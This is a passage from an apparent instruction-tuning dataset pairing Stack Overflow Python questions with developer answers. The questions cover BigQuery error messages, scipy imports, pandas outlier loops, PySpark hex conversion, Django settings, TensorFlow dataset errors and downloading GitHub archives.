schema) results in a much more helpful message:<\/p>\n<blockquote>\n<p>BigQuery error in load operation: Error processing job '...': Provided Schema does not match Table &lt;table name&gt;. Field &lt;field name&gt; has changed type from TIMESTAMP to\nDATE<\/p>\n<\/blockquote>\n<p>My question now is how would I be able to retrieve such helpful message from the Python API?<\/p>\n<h2>Solution based on accepted answer<\/h2>\n<p>Here is a copy and past workaround that one could add in order to show more information by default. (There may be downsides to it)<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import google.cloud.exceptions\nimport google.cloud.bigquery.job\n\n\ndef get_improved_bad_request_exception(\n    job: google.cloud.bigquery.job.LoadJob\n) -&gt; google.cloud.exceptions.BadRequest:\n    errors = job.errors\n    result = google.cloud.exceptions.BadRequest(\n        '; '.join([error['message'] for error in errors]),\n        errors=errors\n    )\n    result._job = job\n    return result\n\n\ndef wait_for_load_job(\n    job: google.cloud.bigquery.job.LoadJob\n):\n    try:\n        job.result()\n    except google.cloud.exceptions.BadRequest as exc:\n        raise get_improved_bad_request_exception(job) from exc\n<\/code><\/pre>\n<p>Then calling <code>wait_for_load_job(job)<\/code> instead of <code>job.result()<\/code> directly, will result in a more useful exception (the error message and <code>errors<\/code> property).<\/p>","output_text":"<p>To be able to show a more helpful error message, you can import <code>google.api_core.exceptions.BadRequest<\/code> to catch exceptions and then use <a href=\"https:\/\/googleapis.dev\/python\/bigquery\/latest\/generated\/google.cloud.bigquery.job.LoadJob.html#google.cloud.bigquery.job.LoadJob.errors\" rel=\"nofollow noreferrer\">LoadJob attribute errors<\/a> to get verbose error messages from the job.<\/p>\n<pre><code>from google.api_core.exceptions import BadRequest\n...\n...\ntry:\n    load_job.result()# Waits for the job to complete.\nexcept BadRequest:\n    for error in load_job.errors:\n        print(error[&quot;message&quot;])  # error is of type dictionary\n<\/code><\/pre>\n<p>For testing I used the sample code <a href=\"https:\/\/github.com\/googleapis\/python-bigquery\/blob\/HEAD\/samples\/load_table_uri_json.py\" rel=\"nofollow noreferrer\">BQ load json data<\/a> and changed the input file to produce an error. In the file I changed the value for <code>&quot;post_abbr&quot;<\/code> from string to an array value.<\/p>\n<p>File used:<\/p>\n<pre><code>{&quot;name&quot;: &quot;Alabama&quot;, &quot;post_abbr&quot;: &quot;AL&quot;}\n{&quot;name&quot;: &quot;Alaska&quot;, &quot;post_abbr&quot;:  &quot;AK&quot;}\n{&quot;name&quot;: &quot;Arizona&quot;, &quot;post_abbr&quot;: [65,2]}\n<\/code><\/pre>\n<p>See output below when code snippet above is applied. The last error message shows the actual error about <code>&quot;post_abbr&quot;<\/code> receiving an Array for a non repeated field.<\/p>\n<pre><code>Error while reading data, error message: JSON table encountered too many errors, giving up. Rows: 3; errors: 1. Please look into the errors[] collection for more details.\nError while reading data, error message: JSON processing encountered too many errors, giving up. Rows: 3; errors: 1; max bad: 0; error percent: 0\nError while reading data, error message: JSON parsing error in row starting at position 78: Array specified for non-repeated field: post_abbr.\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Proper way to import from scipy submodules<p>I am having trouble understanding why the following ways to access <code>scipy.sparse.linalg.norm<\/code> work and do not work respectively:<\/p>\n\n<pre><code>(base) \u279c  ~ ipython\nPython 3.7.4 (default, Aug 13 2019, 20:35:49) \nType 'copyright', 'credits' or 'license' for more information\nIPython 7.13.0 -- An enhanced Interactive Python. Type '?' for help.\n\nIn [1]: from scipy import sparse                                                                                                               \n\nIn [2]: sparse.linalg.norm                                                                                                                     \n---------------------------------------------------------------------------\nAttributeError                            Traceback (most recent call last)\n&lt;ipython-input-2-bfa688e1c7b4&gt; in &lt;module&gt;\n----&gt; 1 sparse.linalg.norm\n\nAttributeError: module 'scipy.sparse' has no attribute 'linalg'\n\nIn [3]: from scipy.sparse.linalg import norm                                                                                                   \n\nIn [4]: import scipy; scipy.__version__                                                                                                        \nOut[4]: '1.4.1'\n<\/code><\/pre>\n\n<p>Can someone explain?<\/p>\n\n<p>Additionally, I think I remember using sparse.linalg.norm directly in the past, where it worked fine.<\/p>","output_text":"<p>According to <a href=\"https:\/\/stackoverflow.com\/questions\/3781522\/why-do-python-modules-sometimes-not-import-their-sub-modules\">this<\/a> brilliant answer: <\/p>\n\n<blockquote>\n  <p>In Python, modules need to be imported before they're accessible.\n  import logging imports just the logging module. It so happens that\n  logging is a package with submodules, but those submodules are still\n  not automatically loaded. So, you need to explicitly import\n  logging.handlers before you can access it.<\/p>\n  \n  <p>If you're wondering why it looks like sometimes you don't need those\n  extra imports: some packages import some or all of their submodules\n  when they are imported -- simply by doing those imports in their\n  <strong>init<\/strong>.py files. In other cases it might be that something else that you import, also imported logging.handlers. It doesn't matter which\n  piece of code does the import; as long as something in your process\n  imports logging.handlers before you access it, it'll be there. And\n  sometimes a module that looks like a package really isn't one, like os\n  and os.path. os isn't a package, it just imports the correct other\n  module (for your platform) and calls it path, just so you can access\n  it as os.path.<\/p>\n<\/blockquote>\n\n<p>So if we delve into <code>scipy.sparse<\/code> and see its <code>__init__.py<\/code> we see that they have not imported the submodules while loading the base module. This is the block of code which does the imports:<\/p>\n\n<pre><code>from __future__ import division, print_function, absolute_import\n\n# Original code by Travis Oliphant.\n# Modified and extended by Ed Schofield, Robert Cimrman,\n# Nathan Bell, and Jake Vanderplas.\n\nimport warnings as _warnings\n\nfrom .base import *\nfrom .csr import *\nfrom .csc import *\nfrom .lil import *\nfrom .dok import *\nfrom .coo import *\nfrom .dia import *\nfrom .bsr import *\nfrom .construct import *\nfrom .extract import *\nfrom ._matrix_io import *\n\n# For backward compatibility with v0.19.\nfrom . import csgraph\n<\/code><\/pre>\n\n<hr>\n\n<p>So for your question, all you have to do is:<\/p>\n\n<pre><code>from scipy.sparse import linalg\n<\/code><\/pre>\n\n<p>And then call <code>linalg.norm<\/code> on a sparse matrix.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n An infinite while loop in python with pandas calculating the standard deviation<h2>We're trying to delete outliers, but got an infinite loop instead<\/h2>\n<p>For a school project we (me and a friend) decided it'd be a good idea to create a tool based on data science. For this we started cleaning a database (I  won't import it here because it is too big (<a href=\"https:\/\/static.rijdendetreinen.nl\/data\/disruptions\/2019\/disruptions-2011-2019.xlsx\" rel=\"nofollow noreferrer\">xlsx file<\/a>, <a href=\"https:\/\/static.rijdendetreinen.nl\/data\/disruptions\/2019\/disruptions-2011-2019.csv\" rel=\"nofollow noreferrer\">csv file<\/a>)). We're now trying to delete outliers using the 'standard deviation*3 + mean' rule for the column 'duration_minutes'.<\/p>\n<p>Here is the code we used to calculate the standard-deviation and the mean:<\/p>\n<pre><code>def calculateSD(database, column):\n    column = database[[column]]\n    SD = column.std(axis=None, skipna=None, level=None, ddof=1, numeric_only=None)\n    return SD\n\ndef calculateMean(database, column):\n    column = database[[column]]\n    mean = column.mean()\n    return mean\n<\/code><\/pre>\n<p>We thought to do the following:<\/p>\n<pre><code>#Now we have to remove the outliers using the code from the SD.py and SDfunction.py files\nminutes = trainsData['duration_minutes'].tolist() #takes the column duration_minutes and puts it in a list\nSD = int(calculateSD(trainsData, 'duration_minutes')) #calculates the SD of the column\nmean = int(calculateMean(trainsData, 'duration_minutes'))\nSDhigh = mean+3*SD\n<\/code><\/pre>\n<p>The code above calculates the beginning values. Then we started a while-loop to delete outliers. After the outliers are deleted, we re-calculate the standard-deviation, the mean, and the SDhigh again. This is the while-loop:<\/p>\n<pre><code>while np.any(i &gt;= SDhigh for i in minutes): #used to be &gt;=, it doesnt matter for the outcome\n    trainsData = trainsData[trainsData['duration_minutes'] &lt; SDhigh] #used to be &gt;=, this caused an infinite loop so I changed it to &lt;=. Then to &lt;\n    minutes = trainsData['duration_minutes'].tolist()\n    SD = int(calculateSD(trainsData, 'duration_minutes')) #calculates the SD of the column\n    mean = int(calculateMean(trainsData, 'duration_minutes'))\n    SDhigh = mean+3*SD\n    print(SDhigh) #to see how the values changed and to confirm it is an infinite loop\n<\/code><\/pre>\n<p>the output is along the lines of the following:<\/p>\n<pre><code>611\n652\n428\n354\n322\n308\n300\n296\n296\n296\n296\n<\/code><\/pre>\n<p>it continues to print 296, and after hours of trying to solve it we came to the conclusion that we're not as smart as we wished.<\/p>\n<hr \/>\n<p>TL;DR: We're trying to remove all values higher than standard-deviation*3+mean, until none are left (we re-calculate this every time to check if there still are outliers left). However, we get an infinite loop.<\/p>","output_text":"<p>You are making things more difficult than they have to be. Calculating the standard deviation to remove outliers and then recalculating it etc is overly complicated (and statistically un-sound). You are better off by using percentile instead of standard deviation<\/p>\n<pre><code>import numpy as np\nimport pandas as pd\n\n# create data\nnums = np.random.normal(50, 8, 200)\ndf = pd.DataFrame(nums, columns=['duration'])\n\n# set threshold based on percentiles\nthreshold = df['duration'].quantile(.95) * 2\n\n# now only keep rows that are below the threshold\ndf = df[df['duration']&lt;threshold]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Converting column to\/from hex in PySpark using Python<p>I have a DataFrame (converted from PySpark RDD using .toDF) that contains a few columns of data.  One column contains values in hex format, eg.:<\/p>\n<pre><code>+----------+\n|        id|\n+----------+\n|0x0087AFEE|\n|0x00840190|\n|0x0082F4D3|\n|0x00871A60|\n|0x00850A0E|\n|0x0084557C|\n...\n<\/code><\/pre>\n<p>In another DataFrame I have the same ID, but in decimal values, which I want to join with this column.  I assume I need to convert these values to base 10 decimal first (or vice versa) in order to compare.  How can I accomplish this?<\/p>\n<p>I tried:<\/p>\n<pre><code>    df.withColumn('dec_id', sf.conv(df['id'], 16, 10))\n<\/code><\/pre>\n<p>but this gives back 0's.<\/p>","output_text":"<p>You need to remove <code>0x<\/code> using <code>substring<\/code> (note that string index starts from 1):<\/p>\n<pre><code>import pyspark.sql.functions as F\n\ndf.withColumn('dec_id', F.expr(&quot;conv(substring(id, 3), 16, 10)&quot;)).show()\n+----------+-------+\n|        id| dec_id|\n+----------+-------+\n|0x0087AFEE|8892398|\n|0x00840190|8651152|\n|0x0082F4D3|8582355|\n|0x00871A60|8854112|\n|0x00850A0E|8718862|\n|0x0084557C|8672636|\n+----------+-------+\n<\/code><\/pre>\n<p>Note that the result is in string type. If you want to have int\/long type, you can cast accordingly, e.g.<\/p>\n<pre><code>&quot;int(conv(substring(id, 3), 16, 10))&quot;\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n modules cannot load in a new Django project<p>I made 2 projects with django so far and everything smooth.<\/p>\n<p>using python 3.6 and conda env with django 3.1.4<\/p>\n<p>I am following the tutorial to kick off my new project as I did for my previous one : <a href=\"https:\/\/docs.djangoproject.com\/fr\/3.1\/intro\/tutorial01\/\" rel=\"nofollow noreferrer\">https:\/\/docs.djangoproject.com\/fr\/3.1\/intro\/tutorial01\/<\/a><\/p>\n<p>Start a new one using &quot;django-admin startproject ngedemocarto&quot;\nthen used &quot;django startapp sitemanager&quot; it gives me this :<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/MrYTt.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/MrYTt.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>but suddenly in this project I keep having error when I try to call any app module like &quot;apps.py&quot; or &quot;urls.py&quot;<\/p>\n<p>typical error if I add the app config in settings.py like this :<\/p>\n<pre><code>INSTALLED_APPS = [\n    'sitemanager.apps.SitemanagerConfig'\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n]\n<\/code><\/pre>\n<p>resolve in this error :<\/p>\n<pre><code>ModuleNotFoundError: No module named 'sitemanager.apps.SitemanagerConfigdjango'; 'sitemanager.apps' is not a package\n<\/code><\/pre>\n<p>every command like manage.py runserver or manage.py migrate is failing at import because it can't resolve any names like &quot;sitemanager.apps&quot; or &quot;sitemanager.urls&quot;<\/p>\n<p>I checked basic things :<\/p>\n<ul>\n<li>I have a <strong>init<\/strong>.py at sitemanager root folder<\/li>\n<li>urls.py or apps.py exist<\/li>\n<li>if I use python in cmd at mynewproject folder and try import &quot;sitemanager.apps&quot; , it works. ( no error)<\/li>\n<\/ul>\n<p>I am in a very basic config just after starting this new project and nothing works ...<\/p>\n<p>I tried to build a new conda env, start a new django project, same thing.<\/p>\n<p>I don't really know where I should look to solve this problem and how to troubleshot it.\nIt may be an issue with the way python import modules and how I use my python env,\nmaybe something wrong in sys.path either<\/p>\n<p>My others project keep working, I can use runserver and migrate for exemple.<\/p>\n<p>EDIT &amp; ANSWER:<\/p>\n<p>well,\nI was missing a coma for my appconfig\nand I didn't create urls.py in sitemanager (was only in the main project)....<\/p>\n<p>Guess I should have take a break, thanks.<\/p>","output_text":"<p>You have to add a comma after 'sitemanager.apps.SitemanagerConfig'. The lack of a comma has the effect of django trying to find 'sitemanager.apps.SitemanagerConfigdjango', which does not exist:<\/p>\n<p>before:<\/p>\n<pre><code>INSTALLED_APPS = [\n    'sitemanager.apps.SitemanagerConfig'\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n]\n<\/code><\/pre>\n<p>after:<\/p>\n<pre><code>INSTALLED_APPS = [\n    'sitemanager.apps.SitemanagerConfig',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n]\n<\/code><\/pre>\n<p>Alternatively, can just add 'sitemanager' instead of 'sitemanager.apps.SitemanagerConfig'<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n try and except do not work with tensorflow exceptions<p>You'll need this <a href=\"https:\/\/colab.research.google.com\/drive\/1PsPyJNCwOen5RVI3wQ0g2VrHLrrytaE3?usp=sharing\" rel=\"nofollow noreferrer\">notebook<\/a> to reproduce the error which downloads the files below and runs the exact same code following the description.<\/p>\n<ul>\n<li><code>labels.csv<\/code>: each row contains <code>x0<\/code>, <code>y0<\/code>, <code>x1<\/code>, <code>y1<\/code> text coordinates, and other columns not affecting the outcome.<\/li>\n<li><code>yolo-train-0.tfrecord<\/code>: Contains 90% of the examples found in <code>labels.csv<\/code>. Each example contains all labels\/rows corresponding to the image in the example.<\/li>\n<\/ul>\n<p>I'm experiencing a recurring error that happens when iterating over a tfrecord dataset.\nAfter 2000-4000 iterations that successfully read batches from the dataset, I get the following error:<\/p>\n<pre><code>iteration: 3240 2022-02-14 04:25:15.376625: W tensorflow\/core\/framework\/op_kernel.cc:1745] OP_REQUIRES failed at scatter_nd_op.cc:219 : INVALID_ARGUMENT: indices[189] = [6, 30, 38, 0] does not index into shape [8,38,38,3,6]\nTraceback (most recent call last):\n  File &quot;\/usr\/local\/lib\/python3.7\/dist-packages\/tensorflow\/python\/data\/ops\/iterator_ops.py&quot;, line 800, in __next__\n    return self._next_internal()\n  File &quot;\/usr\/local\/lib\/python3.7\/dist-packages\/tensorflow\/python\/data\/ops\/iterator_ops.py&quot;, line 786, in _next_internal\n    output_shapes=self._flat_output_shapes)\n  File &quot;\/usr\/local\/lib\/python3.7\/dist-packages\/tensorflow\/python\/ops\/gen_dataset_ops.py&quot;, line 2845, in iterator_get_next\n    _ops.raise_from_not_ok_status(e, name)\n  File &quot;\/usr\/local\/lib\/python3.7\/dist-packages\/tensorflow\/python\/framework\/ops.py&quot;, line 7107, in raise_from_not_ok_status\n    raise core._status_to_exception(e) from None  # pylint: disable=protected-access\ntensorflow.python.framework.errors_impl.InvalidArgumentError: indices[189] = [6, 30, 38, 0] does not index into shape [8,38,38,3,6]\n     [[{{function_node __inference_transform_targets_for_output_1051}}{{node TensorScatterUpdate}}]] [Op:IteratorGetNext]\n<\/code><\/pre>\n<p>It is near impossible to tell which exact inputs that are causing the issue thanks to tensorflow's brilliant graph execution. I tried using <code>pdb<\/code>, <code>tf.print<\/code> statements and many other desperate measures trying to identify which examples in <code>labels.csv<\/code> that cause the problem and need to be excluded, and nothing looks particularly suspicious.<\/p>\n<p>Here's what the notebook runs and eventually results in the error mentioned.<\/p>\n<pre><code>import numpy as np\nimport pandas as pd\nimport tensorflow as tf\n\n\ndef transform_images(x, image_shape):\n    x = tf.image.resize(x, image_shape)\n    return x \/ 255\n\n\n@tf.function\ndef transform_targets_for_output(y_true, grid_size, anchor_indices):\n    n = tf.shape(y_true)[0]\n    y_true_out = tf.zeros((n, grid_size, grid_size, tf.shape(anchor_indices)[0], 6))\n    anchor_indices = tf.cast(anchor_indices, tf.int32)\n    indexes = tf.TensorArray(tf.int32, 1, dynamic_size=True)\n    updates = tf.TensorArray(tf.float32, 1, dynamic_size=True)\n    idx = 0\n    for i in tf.range(n):\n        for j in tf.range(tf.shape(y_true)[1]):\n            if tf.equal(y_true[i][j][2], 0):\n                continue\n            anchor_eq = tf.equal(anchor_indices, tf.cast(y_true[i][j][5], tf.int32))\n            if tf.reduce_any(anchor_eq):\n                box = y_true[i][j][0:4]\n                box_xy = (y_true[i][j][0:2] + y_true[i][j][2:4]) \/ 2\n                anchor_idx = tf.cast(tf.where(anchor_eq), tf.int32)\n                grid_xy = tf.cast(box_xy \/\/ (1 \/ grid_size), tf.int32)\n                indexes = indexes.write(\n                    idx, [i, grid_xy[1], grid_xy[0], anchor_idx[0][0]]\n                )\n                updates = updates.write(\n                    idx, [box[0], box[1], box[2], box[3], 1, y_true[i][j][4]]\n                )\n                idx += 1\n    return tf.tensor_scatter_nd_update(y_true_out, indexes.stack(), updates.stack())\n\n\ndef transform_targets(y, anchors, anchor_masks, size):\n    y_outs = []\n    grid_size = size \/\/ 32\n    anchors = tf.cast(anchors, tf.float32)\n    anchor_area = anchors[..., 0] * anchors[..., 1]\n    box_wh = y[..., 2:4] - y[..., 0:2]\n    box_wh = tf.tile(tf.expand_dims(box_wh, -2), (1, 1, tf.shape(anchors)[0], 1))\n    box_area = box_wh[..., 0] * box_wh[..., 1]\n    intersection = tf.minimum(box_wh[..., 0], anchors[..., 0]) * tf.minimum(\n        box_wh[..., 1], anchors[..., 1]\n    )\n    iou = intersection \/ (box_area + anchor_area - intersection)\n    anchor_idx = tf.cast(tf.argmax(iou, axis=-1), tf.float32)\n    anchor_idx = tf.expand_dims(anchor_idx, axis=-1)\n    y = tf.concat([y, anchor_idx], axis=-1)\n    for anchor_indices in anchor_masks:\n        y_outs.append(transform_targets_for_output(y, grid_size, anchor_indices))\n        grid_size *= 2\n    return tuple(y_outs)\n\n\ndef read_example(\n    example,\n    feature_map,\n    class_table,\n    max_boxes,\n    image_shape,\n):\n    features = tf.io.parse_single_example(example, feature_map)\n    image = tf.image.decode_png(features['image'], channels=3)\n    image = tf.image.resize(image, image_shape)\n    object_name = tf.sparse.to_dense(features['object_name'])\n    label = tf.cast(class_table.lookup(object_name), tf.float32)\n    label = tf.stack(\n        [tf.sparse.to_dense(features[feature]) for feature in ['x0', 'y0', 'x1', 'y1']]\n        + [label],\n        1,\n    )\n    padding = [[0, max_boxes - tf.shape(label)[0]], [0, 0]]\n    label = tf.pad(label, padding)\n    return image, label\n\n\ndef read_tfrecord(\n    fp,\n    classes_file,\n    image_shape,\n    max_boxes,\n    shuffle_buffer_size,\n    batch_size,\n    anchors,\n    masks,\n    classes_delimiter='\\n',\n):\n    text_initializer = tf.lookup.TextFileInitializer(\n        classes_file, tf.string, 0, tf.int64, -1, delimiter=classes_delimiter\n    )\n    class_table = tf.lookup.StaticHashTable(text_initializer, -1)\n    files = tf.data.Dataset.list_files(fp)\n    dataset = files.flat_map(tf.data.TFRecordDataset)\n    feature_map = {\n        'image': tf.io.FixedLenFeature([], tf.string),\n        'x0': tf.io.VarLenFeature(tf.float32),\n        'y0': tf.io.VarLenFeature(tf.float32),\n        'x1': tf.io.VarLenFeature(tf.float32),\n        'y1': tf.io.VarLenFeature(tf.float32),\n        'object_name': tf.io.VarLenFeature(tf.string),\n        'object_index': tf.io.VarLenFeature(tf.int64),\n    }\n    return (\n        dataset.map(\n            lambda x: read_example(x, feature_map, class_table, max_boxes, image_shape),\n            tf.data.experimental.AUTOTUNE,\n        )\n        .batch(batch_size)\n        .shuffle(shuffle_buffer_size)\n        .map(\n            lambda x, y: (\n                transform_images(x, image_shape),\n                transform_targets(y, anchors, masks, image_shape[0]),\n            )\n        )\n        .prefetch(tf.data.experimental.AUTOTUNE)\n    )\n\n\nif __name__ == '__main__':\n    input_shape = (608, 608, 3)\n    labels = pd.read_csv('labels.csv')\n    classes_file = 'classes.txt'\n    max_boxes = max([g[1].shape[0] for g in labels.groupby('image')])\n    shuffle_buffer_size = 256\n    batch_size = 8\n    anchors = np.array(\n            [\n                (10, 13),\n                (16, 30),\n                (33, 23),\n                (30, 61),\n                (62, 45),\n                (59, 119),\n                (116, 90),\n                (156, 198),\n                (373, 326),\n            ]\n        ) \/ np.array(input_shape[:-1])\n    masks = np.array([[6, 7, 8], [3, 4, 5], [0, 1, 2]])\n    train_dataset = read_tfrecord(\n                '\/content\/yolo-train-0.tfrecord',\n                classes_file,\n                input_shape[:-1],\n                max_boxes,\n                shuffle_buffer_size,\n                batch_size,\n                anchors,\n                masks,\n            )\n    for i, _ in enumerate(train_dataset, 1):  # There should be around 11000 iterations\n        print(f'\\riteration: {i}', end='')\n<\/code><\/pre>\n<p>Is there a way to filter out the problematic examples?<\/p>\n<p>I tried the following using try and except blocks and it doesn't work and gives the exception being specified despite adding the following to <code>create_tfrecord<\/code><\/p>\n<pre><code>dataset = iter(dataset)\nwhile True:\n    try: \n        yield next(dataset)\n    except InvalidArgumentError:\n        pass\n<\/code><\/pre>","output_text":"<p>Wrapping the <code>transform_targets_for_output<\/code> method with a <code>try-except-raise<\/code> clause and applying <code>tf.data.experimental.ignore_errors<\/code> to the dataset seems to actually work:<\/p>\n<pre><code>def transform_targets_for_output(y_true, grid_size, anchor_indices):\n    try:\n      n = tf.shape(y_true)[0]\n      y_true_out = tf.zeros((n, grid_size, grid_size, tf.shape(anchor_indices)[0], 6))\n      anchor_indices = tf.cast(anchor_indices, tf.int32)\n      indexes = tf.TensorArray(tf.int32, 1, dynamic_size=True)\n      updates = tf.TensorArray(tf.float32, 1, dynamic_size=True)\n      idx = 0\n      for i in tf.range(n):\n          for j in tf.range(tf.shape(y_true)[1]):\n              if tf.equal(y_true[i][j][2], 0):\n                  continue\n              anchor_eq = tf.equal(anchor_indices, tf.cast(y_true[i][j][5], tf.int32))\n              if tf.reduce_any(anchor_eq):\n                  box = y_true[i][j][0:4]\n                  box_xy = (y_true[i][j][0:2] + y_true[i][j][2:4]) \/ 2\n                  anchor_idx = tf.cast(tf.where(anchor_eq), tf.int32)\n                  grid_xy = tf.cast(box_xy \/\/ (1 \/ grid_size), tf.int32)\n                  indexes = indexes.write(\n                      idx, [i, grid_xy[1], grid_xy[0], anchor_idx[0][0]]\n                  )\n                  updates = updates.write(\n                      idx, [box[0], box[1], box[2], box[3], 1, y_true[i][j][4]]\n                  )\n                  idx += 1\n      return tf.tensor_scatter_nd_update(y_true_out, indexes.stack(), updates.stack())\n    except tf.errors.InvalidArgumentError:\n        raise\n<\/code><\/pre>\n<p>Using a batch size of 8, I was able to iterate through the dataset successfully:<\/p>\n<pre><code>train_dataset = train_dataset.apply(tf.data.experimental.ignore_errors())\nfor i, _ in enumerate(train_dataset, 1):  # There should be around 11000 iterations\n  print(f'\\riteration: {i}', end='')\n<\/code><\/pre>\n<pre><code>iteration: 11244\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Range at one order-of-magnitude in Python<p>I want to print <code>x<\/code> at one order-of-magnitude. However, there is an error. The desired output is attached.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>for x in range(0,1e-3):\n    print(x)\n<\/code><\/pre>\n<p>The error is:<\/p>\n<pre><code>&lt;module&gt;\n    for x in range(0,1e-3):\n\nTypeError: 'float' object cannot be interpreted as an integer\n<\/code><\/pre>\n<p>The desired output is:<\/p>\n<pre><code>0\n1e-6\n1e-5\n1e-4\n1e-3\n<\/code><\/pre>","output_text":"<p>You can use <code>map()<\/code> to generate the powers of 10, and then you can use <code>itertools.chain()<\/code> to add the zero in front:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from itertools import chain\n\nfor x in chain([0], map(lambda x: 10**x, range(-7, -2))):\n    print(x)\n<\/code><\/pre>\n<p>This outputs:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>0\n1e-07\n1e-06\n1e-05\n0.0001\n0.001\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Webscraping: Loop through multiple urls<p>I have successfully scrapped several websites individually.\nHowever, now I want to have a single script so that I don't have to run each script individually all the time.\nI would like to build a for loop that goes through all websites and replaces the x with a string.\nUnfortunately, there are no numbers, with which I could go through the individual pages with &quot;for x in range&quot;, but there are just the strings mentioned.<\/p>\n<p>Here is my current code:<\/p>\n<pre><code>from bs4 import BeautifulSoup\nimport requests\nimport pandas as pd\n    \n\nmovielist = []\n\nfor x in ... ('action', 'comedy', 'thriller', 'drama', 'sport'): # what should i insert instead of ...?\n    r = requests.get(f'https:\/\/movie.com\/{x}', headers=headers)\n    soup = BeautifulSoup(r.text, 'html.parser')\n    spiele = soup.find_all('div', {'class': 'row'})\n<\/code><\/pre>\n<p>The site is not real, its just a question how to do that.<\/p>\n<p>I am very happy about your help, thank you very much.<\/p>","output_text":"<p>Just remove the ...\nYour tuple is iterable to you can go through every element like this:<\/p>\n<pre><code>for x in ('action', 'comedy', 'thriller', 'drama', 'sport'): # what should i insert instead of ...?\n    print(f'https:\/\/movie.com\/{x}')\n<\/code><\/pre>\n<p>output:<\/p>\n<pre><code>https:\/\/movie.com\/action\nhttps:\/\/movie.com\/comedy\nhttps:\/\/movie.com\/thriller\nhttps:\/\/movie.com\/drama\nhttps:\/\/movie.com\/sport\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python How to download repository zip file from GitHub using github api<p>I am trying to download zip file of my repository using api but can not do so.<\/p>\n<p>GitHub doc: <a href=\"https:\/\/docs.github.com\/en\/rest\/reference\/repos#download-a-repository-archive-zip\" rel=\"nofollow noreferrer\">github-download-zip-ref<\/a><\/p>\n<p>What is the problem with my code? Thanks for your help .<\/p>\n<p>I get only <code>404: not found error<\/code><\/p>\n<pre><code>import requests\nimport wget\n\nfrom requests.api import request\nheaders = {&quot;Authorization&quot; : 'token ***', &quot;Accept&quot;: 'application\/vnd.github.v3+json'}\nparameters = {&quot;owner&quot;: 'enestekerlek', &quot;repo&quot;: 'Hello-World', &quot;ref&quot;: 'ref'}\n\nr =requests.get('https:\/\/api.github.com\/user\/repos', headers = headers)\nif (r.status_code == 200) : \n    x = requests.get('https:\/\/api.github.com\/repos\/enestekerlek\/Hello-World\/zipball\/ref', headers = headers, params = parameters)\n\n    print(x.content)\n    print(type(x))\nelse :\n    print(&quot;can not connect&quot;)\n<\/code><\/pre>","output_text":"<p>Your first problem can be that you use word <code>ref<\/code> in url.<\/p>\n<p>It has to be (probably) <code>branch name<\/code> or <code>empty string<\/code> for master\/main branch.<\/p>\n<p>Other problem can be that your repo is empty so there is nothing to download. But I couldn't check it because I don't have empty repo and I was using Private Token to access only my repos.<\/p>\n<hr \/>\n<p>Minimal working code which I used for tests.<\/p>\n<pre><code>import requests\n\nheaders = {\n    &quot;Authorization&quot; : 'token ghp_r5***',\n    &quot;Accept&quot;: 'application\/vnd.github.v3+json'\n#    &quot;Accept&quot;: '*.*',\n}\n\nOWNER = 'enestekerlek'\nREPO  = 'Hello-World'\n\nOWNER = 'furas'\n#REPO = 'python-examples'  # it is downloading too long\nREPO  = 'AutoDraw'\n\nREF  = 'main'  # branch name\nREF  = ''      # master\/main branch \n\nEXT  = 'zip'\n#EXT  = 'tar'  # it also works\n\nurl = f'https:\/\/api.github.com\/repos\/{OWNER}\/{REPO}\/{EXT}ball\/{REF}'\nprint('url:', url)\n\nr = requests.get(url, headers=headers)\n\nif r.status_code == 200:\n    print('size:', len(r.content))\n    with open(f'output.{EXT}', 'wb') as fh:\n        fh.write(r.content)\n    print(r.content[:10])  # display only some part\nelse:\n    print(r.text)    \n<\/code><\/pre>\n<p>Result:<\/p>\n<pre><code>url: https:\/\/api.github.com\/repos\/furas\/AutoDraw\/zipball\/\nsize: 663179\nb'PK\\x03\\x04\\n\\x00\\x00\\x00\\x00\\x00'\n<\/code><\/pre>"}
